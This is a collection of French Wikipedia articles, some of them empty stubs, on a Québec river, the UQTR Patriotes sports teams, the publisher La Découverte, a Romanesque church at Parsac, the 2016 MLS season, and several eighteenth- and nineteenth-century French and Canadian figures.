La rivière des Couture prend sa source en bordure du chemin de fer, dans la zone Harlaka, dans le secteur de Saint-Joseph-de-la-Pointe-de-Lévy, soit la partie sud-est de la ville de Lévis. Cette zone de tête est située à au sud de l'autoroute 20, soit au nord de la Grande plée Bleue. Cette source près de milieux humides est située à :
La rivière des Couture coule en zone agricole ou urbaine, plus ou moins en parallèle de la rive-sud du fleuve Saint-Laurent. À partir de sa source, la rivière des Couture" coule sur selon les segments suivants :
La confluence de la rivière des Couture est située sur la rive est de la rivière à la Scie laquelle coule vers l'ouest jusqu'à la rive sud du fleuve Saint-Laurent, dans le secteur de Saint-Télesphore. Cette confluence est située au sud-est de la sortie 325 de l'autoroute 20, au nord d'un parc pour maisons mobiles.
Toponymie.
Le toponyme « Rivière des Couture » a été officialisé le à la Commission de toponymie du Québec.

</doc>
<doc id="9624365" url="https://fr.wikipedia.org/wiki?curid=9624365" title="Emil Benediktoff Hirschfeld">
Emil Benediktoff Hirschfeld



</doc>
<doc id="9624367" url="https://fr.wikipedia.org/wiki?curid=9624367" title="Les Patriotes de l'UQTR">
Les Patriotes de l'UQTR



</doc>
<doc id="9624368" url="https://fr.wikipedia.org/wiki?curid=9624368" title="District de Kandy">
District de Kandy



</doc>
<doc id="9624369" url="https://fr.wikipedia.org/wiki?curid=9624369" title="Georges Annenkoff">
Georges Annenkoff



</doc>
<doc id="9624372" url="https://fr.wikipedia.org/wiki?curid=9624372" title="Patriotes de l'UQTR">
Patriotes de l'UQTR

Les Patriotes de l'UQTR sont les équipes sportives représentant l'Université du Québec à Trois-Rivières dans les ligues inter-universitaires québécoises et ontariennes, participant ainsi aux programmes d'excellence en sport reconnus au Québec et au Canada. L'université aligne des équipes en cheerleading, cross-country, badminton, golf, hockey sur glace, natation, soccer, ski et volley-ball. Elles revendiquent 16 participations en championnat de hockey universitaire, dont 4 victoires nationales (U Sports) depuis 1970, deux records universitaires canadiens en natation, trois participations au championnat de football canadien et plusieurs en golf universitaire. De plus, après une médaille de bronze au championnat canadien universitaire de soccer en 2012, les Patriotes ont levé les grands honneurs en 2019 en battant les Carabins de Montréal par la marque de 2-0. Le but gagnant ayant été marqué par le joueur qui sera repêché par Forge FC au repêchage de la CPL le lendemain, Gabriel Wiethaeuper-Balbinotti.
Les hommes de l’entraîneur Shany Black venaient de terminer champion de la saison régulière du RSEQ pour la première fois en près de 25 ans.
Histoire.
En 1969, le recteur Gilles Boulet a cru en l'importance du sport comme complément à la vie universitaire lors de la création de l'Université du Québec à Trois-Rivières et à sa cohérence avec les études universitaires.
Nom et logo.
En , à la suite d'un concours organisé au sein de la communauté étudiante, le nom « Patriotes » a été adopté pour les équipes de l'UQTR, proposé par Gérald Baril étudiant en histoire et joueur de hockey. Lors des événements d'octobre 1970 au Québec, le nom a été associé à la Rébellion des Patriotes 1837-1838 dans l'esprit de certains mais le recteur Boulet insista pour son maintien en se concentrant sur l'étymologie en disant : « un patriote est celui qui aime sa communauté et fait tous les efforts pour l'améliorer ».
L'UQTR étant la composante régionale de la Mauricie de l'Université du Québec, il a été décidé d'attribuer aux Patriotes les mêmes couleurs que celles des Jeux du Québec qui se sont passés en Mauricie, soit le bleu, l'orange et le blanc. En 1976, l'Université du Québec a attribué une couleur différente à chaque réseau universitaire et peu à peu le bleu des Patriotes est devenu vert. Le Blanc et l'orange, montrant l'énergie et la vivacité, sont en support du vert. Le «P» stylisé, une œuvre de Pierre Rivard professeur d'art, devient le logo. Avec son angle, il donne un effet de mouvement perpétuel qui symbolise la force, la détermination et l'avenir. Entre 1970 et 1979, une mascotte nommée "Yé'Pat" aux couleurs des Patriotes a été dévoilée pour divertir les spectateurs durant les matchs.
Évolution et faits saillants.
En 1970, les diverses équipes des Patriotes, coordonnées par Jean-François Grenier, ont rejoint l'Association sportive inter-universitaire "Ottawa-Saint-Laurent" et représentent l'université aux niveaux provincial et national. Elles ont rejoint l'Association sportive de l'Université du Québec lors de sa création. En 1972, pour récompenser le travail des athlètes-étudiants, des récompenses sportives ont été créées et remises aux meilleurs joueurs de l'année. Dès 1975, grâce à la générosité de la communauté et le dévouement des dirigeants, certaines équipes se sont démarquées dans diverses compétitions. Ainsi, l'équipe de hockey masculin s'est hissée parmi les meilleurs dix équipes universitaires au Canada. Depuis lors, elle se retrouve régulièrement dans ce groupe sélect.
Au fil des ans, plusieurs équipes sportives ont représenté les couleurs de l'UQTR. Lors de sa création, les Patriotes évoluaient dans quatre sports : le football (jusqu'en 1979), le basket-ball masculin (jusqu'en 1985), le basket-ball féminin (jusqu'en 1984) et le hockey masculin (depuis 1984). Le soccer masculin s'est joint en 1976. Au début des années 80, en pleine crise financière, la direction des Patriotes a eu à faire des choix difficiles. Pour continuer à développer le potentiel des équipes sportives de l'UQTR, il fallut laisser tomber certains sports et concentrer les ressources financières. Malgré tout, plusieurs sports ont rejoint les rangs des Patriotes, dont le soccer féminin en 1986, la natation en 1996 et le golf en 2000. Le hockey féminin a eu une équipe de 1990 et 2003 et d'autres clubs sportifs, y compris le ski, le rugby, le volley-ball, le badminton, l'athlétisme et le cross-country.
Au fil des ans, beaucoup de gens ont travaillé et contribué au développement des équipes sportives . Depuis sa création, le département de l'activité physique et des sports a été sous la direction de quatre administrateurs, soit Jean-François Grenier, Yvon Lamarche, Raymond Tellier et Michel Morin.
Pour promouvoir le sport, le Centre des activités physiques et sportives (CAPS) a été ouvert en avril 1995. La piscine olympique dans les nouveaux locaux du CAPS a aidé à former l'année suivante la première équipe de natation de l'UQTR. Les équipes des Patriotes ont été les hôtes de plusieurs grands événements sportifs, entre autres choses, le championnat de hockey 1984, le championnat de soccer extérieur de 1995 et le Championnat provincial de natation de 2008. Après la performance des équipes invitées au championnat de hockey universitaire canadien de 1984, la direction de l'université a confié à Jean-François Grenier la tâche de former un comité dont le mandat serait d'étudier comment améliorer l'équipe de l'université. Présidée par le professeur André Quirion, l'une des recommandations de ce comité fut de donner le statut d'excellence au hockey et d'y allouer les ressources nécessaires, y compris l'embauche d'un entraîneur à plein temps.
Une proposition du milieu des affaires et d'anciens joueurs de l'équipe de football canadien de l'UQTR prévoyait recréer une équipe en 2017 après un "hiatus" de près de 40 ans. Cependant, le conseil d'administration de l'UQTR a rejeté cette option en novembre 2015 à cause des coûts et de l'incertitude du financement universitaire à ce moment.
Championnats et réputation.
Depuis leur création, les équipes des Patriotes se sont distinguées. L'équipe de hockey masculin a remporté la coupe Queen's, remis au champion de la SUO, à 11 reprises (1991, 1992, 1999, 2000, 2001, 2002, 2003, 2007, 2013, 2016 et 2022). De plus, l'équipe a été championne nationale en 1987, 1991, 2001, 2003 et 2022. L'équipe de soccer masculin a remporté le championnat canadien en 2019 et a remporté les championnats provinciaux en 1995 et 2001, ainsi que les championnats intérieurs en 2000, 2003, 2006 et 2007. En natation et en golf, de nombreux athlètes ont excellé et réalisé des performances notables. En 2007, l'équipe de golf a connu son meilleur résultat avec une deuxième place sur le circuit du Québec. Depuis 1997, plusieurs membres de l'équipe de natation ont été médaillés aux championnats canadiens. En outre, certains anciens Patriotes ont évolué dans des structures sportives à l'échelle provinciale, canadienne et internationale comme joueurs, entraîneurs ou gérants.
Le 3 novembre 2023, l'équipe masculine de soccer a remporté le championnat provinciale de la ligue RSEQ à la marque de 2 à 1 face aux Carabins de l'Université de Montréal.
Depuis 40 ans, le sport à l'UQTR de toutes les régions du Québec et d'ailleurs. Les Patriotes sont devenus pour beaucoup d'entre eux la motivation à poursuivre leurs études et obtenir un diplôme.

</doc>
<doc id="9624374" url="https://fr.wikipedia.org/wiki?curid=9624374" title="Adrian Piotrowski">
Adrian Piotrowski



</doc>
<doc id="9624375" url="https://fr.wikipedia.org/wiki?curid=9624375" title="Zones">
Zones



</doc>
<doc id="9624377" url="https://fr.wikipedia.org/wiki?curid=9624377" title="La Découverte">
La Découverte

Les éditions La Découverte sont une maison d’édition de référence dans le champ des sciences humaines et sociales fondées par François Gèze, et née dans le sillage des éditions Maspero en 1983.
Histoire.
François Gèze intègre les éditions Maspero de François Maspero en 1977 et y dirige la collection du Centre d'études et d'initiatives de solidarité internationale. À l'époque, la maison d'édition est le principal éditeur français des théoriciens marxistes et anti-coloniaux.
En 1983, dans un contexte économique difficile, François Maspero quitte la maison qu'il a fondée et la revend sous le nom de La Découverte à François Gèze pour un franc symbolique. S'il n'a plus aucune relation avec La Découverte, celle-ci hérite de son fonds existant, très marqué à gauche, et réimprime et réédite régulièrement par la suite une partie de ses ouvrages existants, ainsi que de bon nombre de ses collaborateurs (dont Fanchita Gonzalez Batlle, qui deviendra sa directrice littéraire).
Les premiers ouvrages de la nouvelle maison d'édition sortent l'année suivante, dans un contexte difficile pour les théories marxistes du fonds Maspero, incluant l'effacement du Parti communiste français comme parti de masse. Gèze recentre donc la production des éditions La Découverte sur les sciences humaines et sociales, moins politisées et plus grand public, et sur des livres de journalistes d'investigation sur des sujets de société en vue.
En 1993, La Découverte s'est rapprochée des éditions Syros, avec lesquelles elle a fusionné en 1996. En 1995, elle est associée aux Éditions ouvrières et aux éditions Syros dans une holding oû la Confédération française démocratique du travail détient des capitaux.
En 1998, La Découverte est vendue au groupe Havas. Le groupe devient Vivendi Universal Publishing début 2001. En 2004, après l'effondrement de Vivendi, La Découverte fait partie des marques vendues par Hachette au groupe Wendel sous le nom d'Editis.
Malgré son rachat par des grands groupes, la maison d'édition continue à se présenter comme maison indépendante. En 2007, La Découverte lance la collection Zones, dirigé par Grégoire Chamayou, un label centré sur la contre-culture et les diverses formes de résistance à l’oppression, notamment dans le sud global.
En 2008, La Découverte reprend la marque Les Empêcheurs de penser en rond, dirigée par Philippe Pignarre, après des désaccords éditoriaux avec les éditions du Seuil censées les racheter à l'origine. En 2015, elle rachète la maison d'édition de Dominique Carré, spécialisée en livres illustrés à caractère scientifique, notamment en urbanisme. La même année, elle lance la "Revue du crieur" avec "Médiapart".
Hugues Jallon devient directeur littéraire en 1997 puis directeur éditorial de La Découverte. En janvier 2014, il reprend la direction de la maison d'édition, tandis que François Gèze reste directeur de collection. Quatre ans plus tard, Jallon devient directeur des éditions du Seuil et est remplacé par Stéphanie Chevrier, fondatrice et directrice des éditions Don Quichotte de La Martinière Groupe. L'année suivante, en 2019, Vincent Bolloré rachète Editis.
Politique numérique.
Dès 1996, La Découverte s’est intéressée au potentiel du numérique en enregistrant tous les ouvrages de la collection « L'État du monde » sur des CD-ROM.
En 2005, La Découverte est à l'initiative du lancement de Cairn.info, portail pour les publications de sciences humaines, avec trois autres maisons d’édition, Belin, De Boeck et Érès. Sur Cairn, La Découverte rend disponible 11 revues, l’ensemble des titres de la collection Repères et plus de 700 ouvrages de sciences humaines et sociales.
Catalogue.
Les éditions La Découverte explorent divers genres éditoriaux dans leur catalogue : des essais et documents, des enquêtes, des livres de poche et des revues mais aussi des bandes dessinées et des beaux livres.
Collections.
« Cahiers libres » (créée en 1959, comme « Textes à l'appui ») est la première collection des éditions Maspero. À ses débuts, la collection est rapidement confrontée à la censure du pouvoir gaulliste, avec une interdiction des livres de Frantz Fanon notamment.
Autre héritage des éditions Maspero, l'annuel économique et géopolitique de référence « L'état du monde » (créé en 1981) est publié annuellement depuis. Chaque volume se focalise sur un thème central et structurant de l'actualité internationale.
En 1983, La Découverte lance la collection Repères, devenue une collection en sciences économiques et sociales. La Découverte a lancé plusieurs collections, dans le domaine des sciences humaines et sociales, dans lesquelles sont publiés des ouvrages de pensée.
Depuis 1996, La Découverte réédite des ouvrages en poche. La collection La Découverte/Poche compte plus de 500 titres en 2020. Cette collection de poche accueille également des titres parus initialement chez d’autres éditeurs.
Depuis 2019, La Découverte publie en partenariat avec le média A.O.C (Analyse. Opinion. Critique]).
La Découverte publie également une collection de bandes dessinées intitulée « Histoire dessinée de la France ».
Revues.
La Découverte publie plusieurs revues dans le champ des sciences humaines et sociales. Depuis 2001, les articles de ces revues sont accessibles en ligne sur le portail cairn.info ; en accès réservé aux abonnés pour les numéros des trois dernières années, en accès libre pour les numéros de plus de 3 ans.
Grands thèmes.
La Découverte a publié de nombreux livres dans le champ des études coloniales et postcoloniales.
La question des luttes et des inégalités sociales est présente dans le catalogue des Éditions La Découverte.
Le travail est une thématique récurrente dans le catalogue de la maison, avec diverses contributions.
Plusieurs ouvrages fondateurs dans le champ des études de genre et du féminisme, issus de la littérature française ou étrangère, ont été publiés par La Découverte qui fait partie des éditeurs français à maintenir, dans les années 2000, la même proportion d'ouvrages de sciences humaines traduits en français que dans les années 1990.
Le catalogue de La Découverte compte des contributions dans le champ de l'écologie, de la psychologie, du sport.

</doc>
<doc id="9624378" url="https://fr.wikipedia.org/wiki?curid=9624378" title="Jean Orillat">
Jean Orillat

Jean Orillat (1733-1779) fut un marchand et négociant de fourrure né à Québec qui a été capturé par les partisans américains au cours de la révolution américaine.
Le fils de Jean Orillat et de Marie Dupuy, il est né à Barbezieux et est venu au Canada à un jeune âge. Il a participé au commerce de la fourrure aux Michillimakinac et La Baye et exploite également un magasin à Montréal. Orillat a également prêté de l'argent et travaillé dans l'immobilier, le bois et le blé. Il a opéré en partenariat avec divers autres marchands, y compris Pierre Foretier et Jean-Gabriel Cerré, après l'invasion de Québec en par les américains. Certaines paroisses dans la Vallée du Richelieu ont rejoint les Américains. Orillat a été envoyé par le gouverneur Guy Carleton avec une offre d'amnistie, mais fut fait prisonnier et amené au Connecticut. Il a réussi à s'échapper à la fin de décembre de la même année et avait repris les affaires en septembre de l'année suivante.
Il a été marié deux fois, deux fois à Montréal : tout d'abord à Marie-Amable Filiau, dit Dubois en 1761, puis à Thérèse-Amable Viger en 1767.
Orillat est mort à Montréal. Après sa mort, sa succession a été laissée à sa fille Luce-Amable. Son mari, que Alexis Réaume a repris l'exploitation des intérêts commerciaux, mais en 1786, l'entreprise de Rashleigh et Compagnie à Londres avait repris l'exploitation de la succession.

</doc>
<doc id="9624383" url="https://fr.wikipedia.org/wiki?curid=9624383" title="Église Notre-Dame de Parsac">
Église Notre-Dame de Parsac

L'église Notre-Dame de Parsac est une église catholique du située dans la commune de Montagne, dans le département de la Gironde, en France.
Localisation.
L'église se situe au sommet d'un rocher, dominant la Barbanne et le hameau de Parsac, sur la route départementale D130.
Historique.
L'église, qui date des , est construite en style roman. Les renseignements historiques sont peu nombreux.
Elle est dédiée à Notre Dame, au vu de la dédicace présente sur la face intérieure du pilier sud de l’arc triomphal. Les « chapelains » de Parsac sont cités en 1364 et l’église est citée sur la liste des paroisses de l’archiprêtré d’Entre-Dordogne en 1398. Le chapitre de Saint-Émilion était collateur et jusqu'en 1770 il percevait les deux tiers de la dîme, moyennant une pension au curé.
Les visites épiscopales des rendent compte de la vétusté de l’église et des travaux à effectuer.
L'église est désaffectée à la suite de la Révolution française et sa réouverture au culte se fait à une date incertaine.
En 1869, l'église de Parsac devient la succursale de Saint-Genès-de-Castillon, puis annexe de Puisseguin en 1877. La commune de Parsac n’existe plus aujourd’hui, elle est rattachée en 1973 à la commune de Montagne.
L'église a été classée au titre des monuments historiques par arrêté du .
Description de l'église.
L'édifice est de plan simple. La nef, ( x ), est divisée en trois travées voûtées. Celle présente sous le clocher porte une coupole ovoïde. Les deux autres reçoivent une voûte en berceau brisée.
Le mur oriental de la nef est percé par un arc diaphragme à double rouleau, qui permet de communiquer avec l’abside en hémicycle, voûtée en cul-de-four, unie à l’extérieur, à sept pans avec arcatures sur colonnes.
Le bâtiment fut édifiée en trois étapes distinctes, mais consécutives.
Sur le plan, on voit que les piles correspondent mal aux fenêtres du côté nord, plus étroites et plus hautes que la fenêtre du côté sud, laquelle est d'apparence moderne. La seule fenêtre ancienne du chevet est percée dans l'axe, à travers un contrefort. Entre l'arc triomphal et le berceau de la nef, la différence de niveau est considérable : on a pratiqué là un large oculus.
L'extérieur.
En 1876, quand E. Piganeau a visité l'église, un grand porche carré de précédait le portail occidental. Quelques années plus tard, quand Léo Drouyn dessinait l'église, le porche avait disparu. Ce porche protégeait les sculptures du portail, qui depuis son démontage, sont très érodées.
Le portail.
Le portail occidental à ogive est formé de trois arcades en plein-cintre qui retombent de chaque côté sur deux colonnettes. La porte a été remaniée à l'époque gothique, mais les chapiteaux romans, à feuillages ou à personnages, ont été respectés.
Les deux chapiteaux externes, vus par Piganeau en 1876, sont ornés de feuillages. Celui du sud a été remplacé. Les deux autres chapiteaux sont historiés.
Le clocher.
Un clocher de plan barlong à deux étages s’élève au-dessus de la porte occidentale. Les deux étages sont séparés, sur chaque façade, par une corniche reposant sur des modillons.
L'étage supérieur, en retrait avec l'étage inférieur, possède des ouvertures cintrées sur chaque côté. La face ouest de l'étage inférieur présente, sur son milieu, une large maçonnerie en contrefort, percée d'une baie oblongue. Les faces sud et nord sont aussi garnies de contreforts qui prennent naissance au niveau des voûtes de la nef.
Ce clocher enferme deux coupoles superposées : la coupole du rez-de-chaussée, qui mesure de hauteur sous clef, est montée sur des arcs en plein cintre; elle est allongée du nord au sud, et les pendentifs présentent aux naissances un angle rentrant. La coupole supérieure n'est peut-être pas ancienne, ou bien elle était d'abord sous toit ; ce qui est certain, c'est que le galbe aplati de cette calotte ne répond nullement à ce que nous savons des coupoles apparentes du Moyen Âge.
Les modillons du clocher.
La corniche de chaque façade du clocher est supportée par des modillons : sept sur la façade ouest ; quatre sur la façade sud ; quatre sur la façade est et quatre sur la façade nord. Ils sont tous assez érodés et certains modillons figurés sont difficiles à identifier. Cependant, il est toujours possible de distinguer des représentations classiques de l'iconographie des modillons romans de la luxure avec : l"'homme inverti" ; l'homme ithyphallique ; les professions maudites de musicien et d'acrobate ; l'eucharistie sacrilège et les monstres maléfiques.
Les modillons au sommet du clocher sont modernes et sans décoration.
Façade ouest du clocher Les sept modillons sont tous érodés et/ou cassés, mais en les regardant sous tous les angles et en les comparant avec d'autres modillons de la région, on peut les identifier :
La face sud du clocher La corniche est supportée par quatre modillons : 
La face nord du clocher La corniche est supportée par six modillons, tous érodés. Deux sont indéchiffrables ; deux sont figurés et deux sont décorés avec un symbole géométrique. 
La façade est du clocher Il y a six modillons qui supportent cette corniche. Un seul est figuré, les autres sont décorés avec de simples formes géométriques et sont peut-être plus modernes. Le modillon figuré, au sud de la corniche, est érodé. Cependant, on peut distinguer un homme, nu et jambes écartées. Il est probablement un homme ithyphallique, un classique dans l'iconographie romane.
La nef et l'abside.
La nef est flanquée, de chaque côté, de trois contreforts à plusieurs retraits. Ils sont régulièrement espacés au sud, irrégulièrement au nord. Sur le mur nord de la nef on peut voir les traces de deux étroites fenêtres romanes qui ont été bouchées.
L'abside est soutenue par trois contreforts simples et éclairée au sud par deux petites fenêtres et à l'est par une baie romane. La corniche de l'abside est sans modillons.
Les modillons de la nef.
Il y a un seul modillon sculpté sur le mur nord de la nef. C'est une représentation de la tête d'un animal/démon, dont les yeux et la bouche sont formés par des trous.
Au sommet de la face sud de la nef court une corniche supportée par onze modillons. Le seul qui est figuré est le deuxième à partir de l'ouest. Il représente la tête d'un homme qui tire sa langue, ses cheveux sont hérissés en forme de rayons. Les autres modillons sont des représentations géométriques : bandeaux, billettes, points etc ou sans décoration. Ils sont tous très érodés.
Cadrans canoniaux.
Sur la façade sud de la nef, se trouvent deux cadrans canoniaux, des cadrans solaires primitifs, utilisés par le clergé pour déterminer les moments de la journée pour pratiquer des actes liturgiques.
L'intérieur.
Chaque côté de la nef présente trois arcades à deux voussures en retrait à plein-cintre, dont les archivoltes portent quelques traces de dents de scie. Des trois travées qui la composent, la première a une voûte hémisphérique ou coupole, qui supporte le clocher. Une arcade plein-cintre la sépare des suivantes, dont la voûte ogivale en pierre est renforcée par trois arc doubleaux de même style.
La nef reçoit le jour par l’oculus à l'est et par des fenêtres ogivales pratiquées au flanc sud.
Le mur qui sépare la nef de l'abside est garni de deux arcs plein-cintre superposés, retombant sur des colonnettes, dont deux supportent les chapiteaux. Les colonnettes centrales n'ont qu'un tailloir uni.
L'abside, voûtée en cul-de-four, est divisée en sept parties égales par autant d'arcades appliquées, semi-circulaires, qui retombent sur des colonnes modernes.
Les trois chapiteaux romans du sanctuaire sont décorés avec des feuillages ou entrelacs.
Les deux chapiteaux du rez-de-chaussée du clocher, à l'entrée de la nef, sont historiés et les deux chapiteaux de l'arc triomphal sont également sculptés.
L'entrée de la nef.
Dans la Gironde on trouve au moins cinq autres sculptures sur ce thème du tatouage sacrilège du corps animal : l'église Saint-Martin de Landiras, l'église Saint-Martin de Saint-Martin-de-Sescas (deux sculptures) et le prieuré de Saint-Macaire (deux sculptures).
Arc triomphal.
Les deux corbeilles des chapiteaux de l'arc triomphal sont sculptées avec un décor de feuillages.
Le tailloir du chapiteau sud est figuré sur le côté nord, visible principalement par le clergé qui officiait dans le sanctuaire. On voit un "homme inverti", c'est-à-dire un homme nu, accroupi, vu de dos pour la partie inférieure de son corps, mais vu de face pour la tête et le buste. Cette représentation, assez répandue dans les églises romanes, était une mise en garde contre l'homosexualité et la luxure en général pour le clergé.
La face correspondante du tailloir du chapiteau nord porte des traces d'une autre personnage. La tête existe toujours, mais le corps a été martelé, qui peut suggérer que le sujet déplaisait aux iconoclastes puritains (souvent les chapiteaux et modillons romans considérés comme «obscènes» ou « impudiques» sont martelés). On peut toujours distinguer les contours des bras et les jambes. Il est possible que le personnage soit une femme en position d'exhibitionnisme génital. Les deux sculptures rappelant aux clergé les vœux de célibat et de chasteté imposés par la réforme grégorienne de 1079. Pour plus de détails voir l'article Iconographie des modillons romans.

</doc>
<doc id="9624390" url="https://fr.wikipedia.org/wiki?curid=9624390" title="Hilton Universal City and Towers">
Hilton Universal City and Towers

Le Hilton Universal City and Towers est un gratte-ciel de 112 mètres de hauteur construit à Los Angeles en Californie aux États-Unis en 1989.
Il abrite un hôtel de la chaine Hilton.
Il est situé à Universal City, une propriété d"'Universal Studios" située dans la Vallée de San Fernando qui comprend le parc à thème "Universal Studios Hollywood", un centre de loisir ("Universal CityWalk"), le "Gibson Amphitheatre" (concerts et autres évènements) et les studios de la compagnie.
C'est l'un des plus grands hôtels de Los Angeles.
voir aussi.
Liste des plus hauts immeubles de Los Angeles

</doc>
<doc id="9624397" url="https://fr.wikipedia.org/wiki?curid=9624397" title="Major League Soccer 2016">
Major League Soccer 2016

La Major League Soccer 2016 est la de la Major League Soccer, le championnat professionnel de soccer d'Amérique du Nord. Elle est composée de vingt équipes (17 des États-Unis et 3 du Canada). À partir de la saison 2017, l'Atlanta United FC et le Minnesota United FC se rajouteront à la MLS.
Trois des quatre places qualificatives des États-Unis pour la Ligue des champions de la CONCACAF 2017-2018 y sont attribuées : au vainqueur du Supporters' Shield et de l'autre association et au vainqueur de la Coupe de la Major League Soccer, tandis que la quatrième place est attribuée au vainqueur de la Lamar Hunt US Open Cup.
Les vingt franchises participantes.
Entraîneurs et capitaines.
Durant l'intersaison, Jason Kreis est licencié du New York City Football Club et est remplacé par Patrick Vieira. Brian Bliss qui avait fini la saison précédente en tant qu'intérimaire au Fire de Chicago est remplacé par Veljko Paunović.
Format de la compétition.
Les 20 équipes sont réparties en 2 associations : Association de l'Ouest (10 équipes) et l'Association de l'Est (10 équipes).
Toutes les équipes disputent 34 rencontres dans un format non balancé plaçant une plus grande importance aux matchs entre les équipes d'une même Association.
Les rencontres se répartissent comme suit :
Les deux meilleures équipes de chaque association sont qualifiées pour les demi-finales d'associations. Les équipes finissant entre la troisième et la sixième place dans chaque association s'affrontent dans un match éliminatoire de premier tour. L'équipe la moins bien classée affrontera en demi-finales d'association, le premier de son association.
En cas d'égalité, les critères suivants départagent les équipes :
Saison régulière.
Résultats.
Matchs inter-conférences.
 
Séries éliminatoires.
Règlement.
Le règlement des séries éliminatoires est le même que la saison dernière. Douze équipes se qualifient pour les séries éliminatoires (soit six équipes par conférence). Les deux premières équipes de chaque conférence se qualifient directement pour les demi-finales de conférence. Pour les matchs du premier tour, la troisième équipe de la conférence de l'Ouest recevra la sixième, tandis que la quatrième recevra la cinquième de cette même association. Il en est de même pour la conférence de l'Est.
Ce tour se déroule en un seul match, avec prolongations et tirs au but éventuels.
La meilleure équipe de chaque conférence affronte en demi-finale de conférence, l'équipe la plus faible issue du premier tour de sa conférence, l'autre demi-finale de chaque conférence mettant aux prises le deuxième contre l'autre équipe issue des séries. Cette organisation est ainsi similaire à la NFL.
Les demi-finales et finales de conférence se déroulent par match aller-retour, avec match retour chez l'équipe la mieux classée. En cas d'égalité de buts à l'issue des deux matchs, l'équipe qui aura inscrit le plus de buts à l'extérieur se qualifie. Sinon, une prolongation de deux périodes de 15 minutes a alors lieu. Cette règle ne s'applique pas à la prolongation. Ainsi, quel que soit le nombre de buts inscrit en prolongation, si les deux équipes restent à égalité, une séance de tirs au but a lieu.
La finale MLS a lieu sur le terrain de la meilleure équipe en phase régulière.
Cette finale se déroule en un seul match, avec prolongations et tirs au but pour départager si nécessaire les équipes.
Le gagnant du championnat se qualifie pour la Ligue des champions de la CONCACAF 2017-2018.
Statistiques individuelles.
Meilleurs buteurs.
Source : MLS
Meilleurs passeurs.
Source : MLS
Meilleurs gardiens.
Il faut avoir joué au moins 900 minutes pour être classé.
Source : MLS
Récompenses individuelles.
Récompenses hebdomadaires.
But de la semaine.
Source : MLS Goal of the Week 2016
Arrêt de la semaine.
Source : MLS Save of the Week 2016

</doc>
<doc id="9624400" url="https://fr.wikipedia.org/wiki?curid=9624400" title="Jean-Gabriel Cerré">
Jean-Gabriel Cerré

Jean-Gabriel Cerré ( – ) est un marchand canadien qui travaillait aux Pays des Illinois et à Saint-Louis.
Bibliographie.
Fils de Joseph Serré et Marie-Madeleine Picard, il est né à Montréal. Cerré s'établit à Kaskaskia en tant que marchand en 1755 mais a conservé des liens commerciaux et personnels avec Montréal. Il a été pragmatique dans sa politique, soutenant les autorités britanniques alors qu'ils étaient dans le contrôle et le transfert de sa loyauté aux Américains après que George Rogers Clark a pris le contrôle de la région. En 1779, il fut nommé un juge de paix pour le quartier. Toutefois, le nouveau gouvernement n'était pas en mesure de maintenir l'ordre et, vers la fin de 1779, il s'installe à Saint Louis, sous Contrôle de l'Espagne. Son entreprise a prospéré et il est devenu une des personnes les plus riches et les plus influentes dans la région. Le contrôle de la Louisiane passé ensuite à la France, qui l'a vendue aux États-Unis en 1803. Cerré est mort à Saint Louis deux ans plus tard, à l'âge de 70 ans.
Il a épousé Cathrerine Giard en 1764. Leur fille Marie-Anne a épousé Pierre-Louis Panet, un notaire de Montréal. Marie-Thérèse épousa René-Auguste Chouteau, fondateur de Saint Louis. Pascal a épousé Thérèse Lamy d'une famille de marchands. Sa plus jeune fille Julie fut mariée à Antoine Pierre Soulard, arpenteur du roi pour le territoire de Louisiane supérieur.
Une rue de Saint Louis a été baptisée Jean-Gabriel Cerré.

</doc>
<doc id="9624406" url="https://fr.wikipedia.org/wiki?curid=9624406" title="Jean Jacques Augustin Rey de Saint-Géry">
Jean Jacques Augustin Rey de Saint-Géry

Jean Jacques Augustin Rey de Saint-Géry est un homme politique français né le à Toulouse (Haute-Garonne) et décédé le à Rabastens (Tarn).
Fils d'un conseiller au Parlement de Toulouse, il émigre en 1792 et rentre en France sous le Directoire. Conseiller général et maire de Castres sous le Premier Empire, il est nommé conseiller d’État. Il est député du Tarn de 1815 à 1816, de 1820 à 1827 et en 1830, siégeant avec les ultra-royalistes.

</doc>
<doc id="9624416" url="https://fr.wikipedia.org/wiki?curid=9624416" title="Henri Félix de Pélissier">
Henri Félix de Pélissier

Henri Félix de Pélissier (1763 - 1844) est un officier militaire et homme politique français.
Il sert le royaume de France sous l'Ancien Régime, puis l'armée des Émigres sous la Révolution. Il reprend du service sous la Restauration et devient commandant militaire de plusieurs départements, en parallèle d'un mandat de député. 
Biographie.
Début de carrière.
Né le à Castres (Tarn), Henri Félix de Pélissier est le fils de Maurice de Pélissier, mousquetaire gris, et de Marguerite de Barbara de Boissézon.
À l'âge de seulement quinze ans, il entre comme cadet au régiment d'infanterie du Maine, le 8 novembre 1778. Le , il est versé en tant que lieutenant au régiment de Condé-dragons.
Les guerres de la révolution.
Monarchiste convaincu, il émigre à la Révolution, et sert dans l'armée des princes. Il intègre la Légion de Mirabeau en tant que capitaine, puis est promu major le 10 décembre 1791. Il monte rapidement les échelons, passant lieutenant-colonel le 28 avril 1792 puis colonel le 8 septembre 1793. Le 26 novembre, il est fait Chevalier de Saint-Louis, puis est blessé à la bataille de Wissembourg, le 13 octobre 1793, alors qu'il monte à l'assaut des lignes de la Lauter. En 1794, il est nommé commandant en second de la légion de Mirabeau, et est de nouveau blessé le 13 août 1796 à la bataille d'Ober-Kammlach. En 1798, il commande une compagnie.
De l'Empire à la Restauration.
Après le démembrement de l'armée de Condé, il rentre en France en 1801. Sous le Premier Empire, il reste sans emploi, et ce jusqu'à la première Restauration, en 1814. Ainsi, lors du retour de Louis XVIII, il est fait commandant provisoire de Toulouse par le duc Louis de France. Le 23 août 1814, il est promu au grade de maréchal de camp, et reçoit le titre de commandeur de Saint-Louis. Lorsque Napoléon revient en France le 27 décembre, il est alors commandant de Nîmes. Il tente de lever ses troupes contre l'empereur, mais échoue et est arrêté. Libéré, il est autorisé à se retirer en son château de Jonquières pour la période des Cent-Jours.
Lors de la Seconde Restauration, il se prononce candidat aux élections législatives de 1815. Le 22 août 1815, il est ainsi élu député du Tarn, par 135 voix sur 175. Il se place alors dans la majorité ultra royaliste de la Chambre introuvable. Il ne se représente pas en 1816, lorsque son mandat se termine le 5 septembre. 
Après cette courte carrière politique, il retourne à l'armée, et est successivement commandant militaire du Tarn le 15 août 1816, de la Vendée, le 21 avril 1820 et de l'Aube, le 6 juin 1821. Il est aussi fait chevalier de la Légion d'honneur le 18 mars 1820, puis officier le 23 mai 1825. 
Admis à la retraite le 5 mars 1832, il décède finalement le en son château de Jonquières (Lavaur, Tarn).
Famille.
